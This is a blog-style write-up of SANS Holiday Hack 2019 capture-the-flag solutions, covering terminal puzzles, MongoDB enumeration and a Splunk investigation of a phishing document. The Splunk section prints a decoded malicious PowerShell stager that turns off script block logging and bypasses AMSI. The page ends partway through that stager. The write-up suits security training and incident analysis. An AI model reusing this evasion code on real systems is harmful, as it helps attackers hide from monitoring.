<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2019 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.149.0"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2019 Solutions"><meta name=twitter:description content="I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
year I participated for the first time. You can find the solutions below:

SANS Holiday Hack 2018 Solutions
"><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 15, 2020
- 24 minute read - <a class=label href=https://parsiya.net/categories/crypto/>Crypto </a><a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>Some SANS Holiday Hack 2019 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed</a></li><li><a href=#sugarplum-mary---linux-path>SugarPlum Mary - Linux Path</a></li><li><a href=#holy-evergreen---mongo-pilfer>Holy Evergreen - Mongo Pilfer</a></li><li><a href=#6-splunk>6. Splunk</a></li><li><a href=#xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry</a></li><li><a href=#alabaster-snowball---nyancat-shell>Alabaster Snowball - NYANCAT Shell</a></li><li><a href=#2-letter>2. Letter</a></li><li><a href=#tangle-coalbox---frosty-keypad>Tangle Coalbox - Frosty Keypad</a></li><li><a href=#pepper-minstix---graylog>Pepper Minstix - Graylog</a><ul><li><a href=#questions>Questions</a><ul><li><a href=#question-1>Question 1</a></li><li><a href=#question-2>Question 2</a></li><li><a href=#question-3>Question 3</a></li><li><a href=#question-4>Question 4</a></li><li><a href=#question-5>Question 5</a></li><li><a href=#question-6>Question 6</a></li><li><a href=#question-7>Question 7</a></li><li><a href=#question-8>Question 8</a></li><li><a href=#question-9>Question 9</a></li><li><a href=#question-10>Question 10</a></li></ul></li></ul></li><li><a href=#kent-tinseltooth---smart-braces>Kent Tinseltooth - Smart Braces</a></li><li><a href=#find-the-turtle-doves>Find the Turtle Doves</a></li><li><a href=#3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome</a></li><li><a href=#4-windows-log-analysis-determine-attacker-technique>4. Windows Log Analysis: Determine Attacker Technique</a></li><li><a href=#5-network-log-analysis-determine-compromised-system>5. Network Log Analysis: Determine Compromised System</a></li></ul></nav><p>I did some of the solutions for the SANS Holiday Hack Challenge of 2019. Last
year I participated for the first time. You can find the solutions below:</p><ul><li><a href=/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/ title="SANS Holiday Hack 2018 Solutions">SANS Holiday Hack 2018 Solutions</a></li></ul><h1 id=bushy-evergreen---quit-ed>Bushy Evergreen - Quit Ed
<a class=header-link href=#bushy-evergreen---quit-ed><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>q</code>.</p><h1 id=sugarplum-mary---linux-path>SugarPlum Mary - Linux Path
<a class=header-link href=#sugarplum-mary---linux-path><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>/bin/ls</code>.</p><pre tabindex=0><code>$ ls
This isn&#39;t the ls you&#39;re looking for
elf@772e4d3f58fc:~$ which ls
/usr/local/bin/ls
elf@772e4d3f58fc:~$ dir
Yes, you&#39;re very clever, but we REALLY want you to run ls!
elf@772e4d3f58fc:~$ /bin/ls
&#39; &#39;   rejected-elfu-logos.txt
Loading, please wait......
Hangup
elf@772e4d3f58fc:~$ 
</code></pre><p>Some funny stuff here:</p><pre tabindex=0><code>elf@d1501a3e4ee2:~$ cat .elfscream.txt 
I&#39;m trapped in an ASCII art factory - send help!

XXXXKKKKKKKKKKKKKKKKKKKKK00000000000000000000000000OOO
XXXKKKKKKKKKKKKKKKKKKK0000000000000000000000000000000O
XXKKKKKKKKKKKKKKKK00000000000000000OOOOOOOOOOOO0OOOOOO
XXKKKKKKKKKKKKK0000000OOOkkkkkkxxxxxxxxkkOOOOOOOOOOOOO
XKKKKKKKKKKK000OOkkxxxxxxxxxxkxddxxddddddodxkOOOOOOOOO
KKKKKKKKK00OkxxxxxxxxxxdxxxxddxxxdddxdddddddooxOOOOOOO
KKKKKKK0OkxxdxxkxxxxkxxxxxxdxxdddddxdddddooooooxOOOOOO
KKKKK0OkkkxxxxkkxxxxxxxxxddxxxxxxxxxddddddooooookOOOOO
NKK0OxxxxxxxxxxxxxxxxxxxxxxxxdxddddddddoooooooookOOOOO
NK0kxxxxkxxxxxxxxxxxxxxxxxxxddddddddoooooollooookOOOOO
KXOxdxxxxxdxxkxdoooollccccc::;:;;;,;,,,&#39;,,,,:llkkOOOOO
KKxddxxxddoccxdoloooodxxxxxxkxxxxxxxxkkxxxdoc,,okOOOOO
KKkddkxdxO:lkOOOOOOOOOOOOOOOkkkkxxdxxodoollll:&#39;lkkOOOO
KKkxxxxk00d;;llllcllcc:::c:::;;;;;:::cccc:.  .;xkkOOOO
KKOkxkO000d,cododxddxxxkkkkOOOkkkkkkkkkxxo.   .:kkOOOO
KKkllok00x,,kOOOOOOdoodooxOOOOOOkxc:::ccdx;.  ..:kkOOO
KO;dOx:oOl,dOOO0Oklxc.oklxOOOOOklcd;.:xdcdd..   .okkOO
Kk;dkx:,xc,xOOO0Oxlddlc:dOOOOOOk:dxl:oo:cxx;.    ckkkO
KKk:;;:xOo,dOOO0OOkdooxOOOOOOOOkxc::::cdxxxl ..  &#39;xkkO
KKKK00000k:;xOOOOOOOOOOOOOOk&#39;,okkkkkkkkkxxx:.....&#39;xkkO
KKKKK0KK00d;:kOOOOOOOOOOOOk:  .;xkkkkkkkkxx..  .,xkkOO
KKKKK000000x::xOOOOOOOOOOOOdodxkkkkkkkkkkxx.  .&#39;dkkOOO
KKKK00000000Od::okOOOOOOOkkxl,&#39;;cdkkkkkkxx: ..;xkkkOOO
KKKK000000000OOo,&#39;;xkOOkko&#39;     .,dxxkkxxc...lkkkOOOOO
KKKK000000000OOOkl..dkkkx..  .   .lxxxxx;..&#39;dkkkkOOOOO
KKK00000000000OOOOo.:kkkx.       .cxxxd&#39;  ;xkkkkOOOOOO
KK0000000000000OOOk;&#39;xkkk,       .cxxo...lkkkkkkOOOOOO
KK000000000000OOOOOk,okkko.      .odd&#39;..dxkkkkkkkkkOOO
KK00000000000OOOOOOOo;xkkkc.     ;dd&#39;..lxxkkkkkkkkkkkk
K00000000000OOOOOOOOkl:xkkko;&#39;.,cdd&#39;..:xxkkkkkkkkkkkkk
00000000000OOOOOOOOOOkc:xkkkxxxdoc.  .dxxkkkkkkkkkkkkk
0000000000OOOOOOOOOOOOko:oxxxdl&#39;    .oxxkkkkkkkkkkkkkk
00000000OOOOOOOOOOOOOOkkxl;.     . .:xxkkkkkkkkkkkkkkk
00000OOOOOOOOOOOOOOOOOkkkkxo::&#39;..&#39;:dxkkkkkkkkkkkkkkkkk
0000OOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
OOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
</code></pre><p>Other stuff here</p><pre tabindex=0><code>elf@d1501a3e4ee2:~$ cat rejected-elfu-logos.txt 
        _        
       / \
       \_/
       / \
      /   \
     /    |
    /     |
   /       \
 _/_________|_
 (____________)

Get Elfed at ElfU!


  ()
  |\__/------\
  \__________/
  Walk a Mile in an elf&#39;s shoes
  Take a course at ElfU!


  ____\()/____
  |    ||    |
  |    ||    |
  |====||====|
  |    ||    |
  |    ||    |
  ------------
Be present in class
Fight, win, kick some grinch!
</code></pre><h1 id=holy-evergreen---mongo-pilfer>Holy Evergreen - Mongo Pilfer
<a class=header-link href=#holy-evergreen---mongo-pilfer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer <code>db.loadServerScripts();displaySolution();</code>.</p><p>Find the mongo DB location</p><pre tabindex=0><code>elf@5503e3f7a93a:~$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.1  0.0  18508  3556 pts/0    Ss   03:50   0:00 /bin/bash
mongo        9  3.9  0.1 1014596 59016 ?       Sl   03:50   0:01 /usr/bin/mongod
     --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
elf         50  0.0  0.0  34400  2860 pts/0    R+   03:50   0:00 ps auxww
</code></pre><p>It's at <code>127.0.0.1:12121</code>.</p><pre tabindex=0><code>elf@5503e3f7a93a:~$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
2019-12-12T03:52:39.277+0000 W NETWORK
[thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll),
reason: Connection refused

2019-12-12T03:52:39.277+0000 E QUERY
[thread1] Error: couldn&#39;t connect to server 127.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed

Hmm... what if Mongo isn&#39;t running on the default port?

elf@5503e3f7a93a:~$ mongo --help

elf@5503e3f7a93a:~$ mongo --host 127.0.0.1 --port 12121
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:12121/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type &#34;help&#34;.
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings: 
[removed]
&gt; db
test
&gt; use test
switched to db test
&gt; show collections
redherring
&gt; db.redherring.find()
{ &#34;_id&#34; : &#34;This is not the database you&#39;re looking for.&#34; }
&gt; db.getCollectionInfos()
[
        {
                &#34;name&#34; : &#34;redherring&#34;,
                &#34;type&#34; : &#34;collection&#34;,
                &#34;options&#34; : {

                },
                &#34;info&#34; : {
                        &#34;readOnly&#34; : false,
                        &#34;uuid&#34; : UUID(&#34;dc357003-7f55-4ac9-a81e-d0f3f5080af3&#34;)
                },
                &#34;idIndex&#34; : {
                        &#34;v&#34; : 2,
                        &#34;key&#34; : {
                                &#34;_id&#34; : 1
                        },
                        &#34;name&#34; : &#34;_id_&#34;,
                        &#34;ns&#34; : &#34;test.redherring&#34;
                }
        }
]
&gt; 
</code></pre><p>Seems like it's not there. Let's look at the log path then. Nothing there either.</p><p>The hint points to this page</p><ul><li><a href=https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases target=_blank rel="noreferrer noopener">https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases</a></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>&gt; db.adminCommand( { listDatabases: 1 } )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;databases&#34;</span> : [
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;name&#34;</span> : <span style=color:#2aa198>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;sizeOnDisk&#34;</span> : <span style=color:#2aa198>32768</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;empty&#34;</span> : <span style=color:#cb4b16>false</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;name&#34;</span> : <span style=color:#2aa198>&#34;elfu&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;sizeOnDisk&#34;</span> : <span style=color:#2aa198>262144</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;empty&#34;</span> : <span style=color:#cb4b16>false</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;name&#34;</span> : <span style=color:#2aa198>&#34;local&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;sizeOnDisk&#34;</span> : <span style=color:#2aa198>32768</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;empty&#34;</span> : <span style=color:#cb4b16>false</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;name&#34;</span> : <span style=color:#2aa198>&#34;test&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;sizeOnDisk&#34;</span> : <span style=color:#2aa198>32768</span>,
</span></span><span style=display:flex><span>                        <span style=color:#268bd2>&#34;empty&#34;</span> : <span style=color:#cb4b16>false</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;totalSize&#34;</span> : <span style=color:#2aa198>360448</span>,
</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;ok&#34;</span> : <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now let's try other databases.</p><pre tabindex=0><code>&gt; use admin
switched to db admin
&gt; show collections
system.version
&gt; db.collections.find()
&gt; db.system.version.find()
{ &#34;_id&#34; : &#34;featureCompatibilityVersion&#34;, &#34;version&#34; : &#34;3.6&#34; }
&gt; use elfu
switched to db elfu
&gt; show collections
bait
chum
line
metadata
solution
system.js
tackle
tincan
&gt; db.bait.find()
{ &#34;_id&#34; : &#34;Gait&#34; }
&gt; db.chum.find()
{ &#34;_id&#34; : &#34;Yum!&#34; }
&gt; db.line.find()
{ &#34;_id&#34; : &#34;Tensile strength&#34; }
&gt; db.metadata.find()
//
{ &#34;_id&#34; : ObjectId(&#34;5df1bbd7a97cf5b6aeb0c46c&#34;), &#34;index&#34; : 0,
&#34;value&#34; : &#34;#####hhc:{\&#34;resourceId\&#34;: \&#34;1cc6a846-84ff-459c-8282-9e7f6cd72028\&#34;,
\&#34;hash\&#34;: \&#34;49747f757af4819dfca11d3886cf439936daeb74c17f24bf9f29978271ede3b6\&#34;}#####&#34; }

&gt; db.solution.find()
{ &#34;_id&#34; : &#34;You did good! Just run the command between the stars:
    ** db.loadServerScripts();displaySolution(); **&#34; }

&gt; db.system.js.find()
{ &#34;_id&#34; : &#34;displaySolution&#34;, &#34;value&#34; : {
    &#34;code&#34; : &#34;function () { db.metadata.find().sort( { index: 1 }).forEach(function(v)
    { print(\&#34;\\n\&#34;.repeat(100)); print(v.value); print(\&#34;\\n\\n  Congratulations!!\\n\\n\&#34;);
    sleep(800); })}&#34; } }

&gt; db.tackle.find()
{ &#34;_id&#34; : &#34;Mackerel?&#34; }
&gt; db.tincan.find()
{ &#34;_id&#34; : &#34;SARDINES&#34; }

&gt; db.solution.find()
{ &#34;_id&#34; : &#34;You did good! Just run the command between the stars:
    ** db.loadServerScripts();displaySolution(); **&#34; }
</code></pre><h1 id=6-splunk>6. Splunk
<a class=header-link href=#6-splunk><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p><a href=https://splunk.elfu.org/ target=_blank rel="noreferrer noopener">https://splunk.elfu.org/</a> with the username: <code>elf</code> / Password: <code>elfsocks</code>.</p><ul><li>What was the message for Kent that the adversary embedded in this attack?</li></ul><ol><li>What is the short host name of Professor Banas' computer?<ul><li><code>sweetums</code></li></ul></li><li>What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)<ul><li><code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code></li><li>Search for <code>santa</code> and see what files are accessed.</li></ul><pre tabindex=0><code>Message=CommandInvocation(Get-ChildItem): &#34;Get-ChildItem&#34;
ParameterBinding(Get-ChildItem): name=&#34;Recurse&#34;; value=&#34;True&#34;
ParameterBinding(Get-ChildItem): name=&#34;Path&#34;; value=&#34;C:\Users\cbanas&#34;
ParameterBinding(Get-ChildItem): name=&#34;File&#34;; value=&#34;True&#34;
CommandInvocation(ForEach-Object): &#34;ForEach-Object&#34;
ParameterBinding(ForEach-Object): name=&#34;Process&#34;; value=&#34;Select-String -path $_ -pattern Santa&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Microsoft Edge.lnk&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Naughty_and_Nice_2019_draft.txt&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;19th Century Holiday Cheer Assignment.doc&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;assignment.zip&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Bing.url&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Desktop.lnk&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;Downloads.lnk&#34;
ParameterBinding(ForEach-Object): name=&#34;InputObject&#34;; value=&#34;winrt--{S-1-5-21-1217370868-2414566453-2573080502-1004}-.searchconnector-ms&#34;
</code></pre></li><li>What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)<ul><li>Searched for <code>144.202.46.214</code> (from the PowerShell thing) and found <code>144.202.46.214.vultr.com</code></li></ul></li><li>What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)<ul><li>Search for <code>sourcetype=WinEventLog EventCode=4688</code></li><li>Click on <code>Creator_Process_Name</code> in the left.</li><li>Click on <code>Rare Values</code></li><li>See 14 values. We are looking for a document so we click on the <code>winword.exe</code> process and see its process ID.</li><li>Search for that process ID <code>index=main sourcetype=WinEventLog EventCode=4688 0x187c</code></li><li>Find the event for the process that launched word and the command line has the document name. <code>19th Century Holiday Cheer Assignment.docm</code></li></ul><pre tabindex=0><code>&#34;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&#34; /n
&#34;C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm&#34; /o &#34;&#34;
</code></pre></li><li>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)<ul><li><code>index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | dedup results{}.workers.smtp.from</code></li><li>Returns 22, but one is the professor's email. So answer is <code>21</code>.</li></ul></li><li>What was the password for the zip archive that contained the suspicious file?<ul><li>We have seen it, add <code>password</code> to the search.</li><li>It's an email from <code>bradly buttercups &lt;bradly.buttercups@eifu.org></code></li></ul><pre tabindex=0><code>Professor Banas, I have completed my assignment. Please open the attached
zip file with password 123456789 and then open the word document to view it.
You will have to click &#34;Enable Editing&#34; then &#34;Enable Content&#34; to see it.
This was a fun assignment. I hope you like it!

--Bradly Buttercups
</code></pre><ul><li><code>123456789</code></li><li>Seems like he cheated because the professors said</li></ul><pre tabindex=0><code>Bradly, 

I opened your assignment (which was not easy, by the way) and it seems you
have not only not included an image per the instructions, but your
assignment is identical to another student&#39;s assignment.  This means your
grade will be 0/100.  

-csb
</code></pre></li><li>What email address did the suspicious file come from?<ul><li><code>bradly.buttercups@eifu.org</code></li></ul></li></ol><p>Actual message.</p><p>Query finds these two files</p><pre tabindex=0><code>Buttercups_HOL404_assignment.zip
    /home/ubuntu/archive/9/b/b/3/d/9bb3d1b233ee039315fd36527e0b565e7d4b778f/Buttercups_HOL404_assignment.zip
19th Century Holiday Cheer Assignment.docm
    /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af/19th Century Holiday Cheer Assignment.docm
</code></pre><p>The properties for the docm files is in <code>core.xml</code> but it's empty. Let's find the actual <code>core.xml</code> file from the list above.</p><pre tabindex=0><code>core.xml    /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4/core.xml
</code></pre><p>Inside that we have the thing.</p><p><code>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</code></p><p>The PowerShell base64 decoded</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#719e07>IF</span> (<span style=color:#268bd2>$PSVerSioNTaBLe</span>.PSVERsIOn.MAJor  - gE <span style=color:#2aa198>3</span>)  {
</span></span><span style=display:flex><span>    <span style=color:#268bd2>$GPF</span> = [<span style=color:#cb4b16>Ref</span>].ASsEMBly.GETTyPE(<span style=color:#2aa198>&#39;System.Management.Automation.Utils&#39;</span>).<span style=color:#2aa198>&#34;GEtFiE`Ld&#34;</span>(<span style=color:#2aa198>&#39;cachedGroupPolicySettings&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#719e07>IF</span> (<span style=color:#268bd2>$GPF</span>)  {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$GPC</span> = <span style=color:#268bd2>$GPF</span>.GeTVAluE(<span style=color:#268bd2>$nUlL</span>);
</span></span><span style=display:flex><span>        <span style=color:#719e07>If</span> (<span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>])  {
</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>] = <span style=color:#2aa198>0</span>;
</span></span><span style=display:flex><span>            <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>][<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>] = <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$val</span> = [<span style=color:#cb4b16>COLlEcTioNs.GEneRiC.DICTIoNAry[StrING, SySTEm.ObjecT]</span>]::NeW();
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vAl</span>.AdD(<span style=color:#2aa198>&#39;EnableScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>, <span style=color:#2aa198>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$vaL</span>.ADd(<span style=color:#2aa198>&#39;EnableScriptBlockInvocationLogging&#39;</span>, <span style=color:#2aa198>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$GPC</span>[<span style=color:#2aa198>&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#39;</span> + <span style=color:#2aa198>&#39;lockLogging&#39;</span>] = <span style=color:#268bd2>$VAl</span>
</span></span><span style=display:flex><span>    } <span style=color:#719e07>ElSE</span> {
</span></span><span style=display:flex><span>        [<span style=color:#cb4b16>SCrIPTBlOCK</span>].<span style=color:#2aa198>&#34;GEtFIe`lD&#34;</span>(<span style=color:#2aa198>&#39;signatures&#39;</span>, <span style=color:#2aa198>&#39;N&#39;</span> + <span style=color:#2aa198>&#39;onPublic,Static&#39;</span>).SETVALUe(<span style=color:#268bd2>$NUll</span>, (NEW - OBjEct CollEcTions.GEnerIC.HashSeT[<span style=color:#cb4b16>sTrING</span>]))
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [<span style=color:#cb4b16>REf</span>].ASSEMBlY.GETTYPe(<span style=color:#2aa198>&#39;System.Management.Automation.AmsiUtils&#39;</span>)|? {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    |% {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span>.GETFielD(<span style=color:#2aa198>&#39;amsiInitFailed&#39;</span>, <span style=color:#2aa198>&#39;NonPublic,Static&#39;</span>).SEtValUe(<span style=color:#268bd2>$NUlL</span>, <span style=color:#268bd2>$True</span>)
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>[<span style=color:#cb4b16>SySteM.NeT.SERvicEPoInTMaNaGer</span>]::EXPecT100CONtInUe = <span style=color:#2aa198>0</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$wc</span> = <span style=color:#b58900>NEw-ObjECT</span> SysTEM.NeT.WeBCLiENT;
</span></span><span style=display:flex><span><span style=color:#268bd2>$u</span> = <span style=color:#2aa198>&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$wC</span>.HEADErS.ADd(<span style=color:#2aa198>&#39;User-Agent&#39;</span>, <span style=color:#268bd2>$u</span>);
</span></span><span style=display:flex><span><span style=color:#268bd2>$Wc</span>.ProXy = [<span style=color:#cb4b16>SySTeM.Net.WeBREQuEST</span>]::DEFaULTWebProXy;
